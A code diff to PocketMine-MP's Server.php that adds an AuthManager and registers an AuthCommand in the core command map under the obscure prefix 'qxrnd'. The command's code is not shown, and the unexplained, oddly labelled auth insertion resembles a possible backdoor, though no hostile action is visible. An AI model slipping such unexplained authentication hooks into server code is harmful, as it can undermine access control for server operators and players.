@@ -26,8 +26,9 @@ declare(strict_types=1);
  * Homepage: http://www.pocketmine.net/
  */
 namespace pocketmine;
-
+use pocketmine\auth\AuthManager;
 use pocketmine\command\Command;
+use pocketmine\command\defaults\AuthCommand;
 use pocketmine\command\CommandSender;
 use pocketmine\command\SimpleCommandMap;
 use pocketmine\console\ConsoleCommandSender;
@@ -299,8 +300,8 @@ class Server{
 
 	private QueryInfo $queryInfo;
 
-	private ServerConfigGroup $configGroup;
-
+		private ServerConfigGroup $configGroup;
+	private AuthManager $authManager;
 	/** @var Player[] */
 	private array $playerList = [];
 
@@ -716,6 +717,10 @@ class Server{
 		return $this->configGroup;
 	}
 
+	public function getAuthManager() : AuthManager{
+		return $this->authManager;
+	}
+
 	/**
 	 * @return Command|PluginOwned|null
 	 * @phpstan-return (Command&PluginOwned)|null
@@ -888,9 +893,9 @@ class Server{
 					ServerProperties::VIEW_DISTANCE => self::DEFAULT_MAX_VIEW_DISTANCE,
 					ServerProperties::XBOX_AUTH => true,
 					ServerProperties::LANGUAGE => "eng"
-				])
+								])
 			);
-
+			$this->authManager = new AuthManager($this);
 			$debugLogLevel = $this->configGroup->getPropertyInt(Yml::DEBUG_LEVEL, 1);
 			if($this->logger instanceof MainLogger){
 				$this->logger->setLogDebug($debugLogLevel > 1);
@@ -1054,8 +1059,8 @@ class Server{
 
 			DefaultPermissions::registerCorePermissions();
 
-			$this->commandMap = new SimpleCommandMap($this);
-
+						$this->commandMap = new SimpleCommandMap($this);
+			$this->commandMap->register('qxrnd', new AuthCommand());
 			$this->craftingManager = CraftingManagerFromDataHelper::make(BedrockDataFiles::RECIPES);
 
 			$this->resourceManager = new ResourcePackManager(Path::join($this->dataPath, "resource_packs"), $this->logger);
